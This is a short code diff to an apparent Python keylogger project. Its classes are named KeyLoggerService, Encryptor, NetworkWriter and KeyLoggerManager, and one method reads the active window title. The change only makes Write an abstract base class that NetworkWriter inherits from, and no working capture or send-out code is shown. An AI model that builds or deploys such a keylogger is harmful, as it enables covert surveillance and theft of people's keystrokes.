@@ -36,7 +36,7 @@ class KeyLoggerService:
     def _get_window(self):
         return gw.getActiveWindow().title
 
-class Write:
+class Write(ABC):
     @abstractmethod
     def write(self, data):
         pass
@@ -88,7 +88,7 @@ class Encryptor:
         return encrypted_data
 
 
-class NetworkWriter():
+class NetworkWriter(Write):
     pass
 
 class KeyLoggerManager:
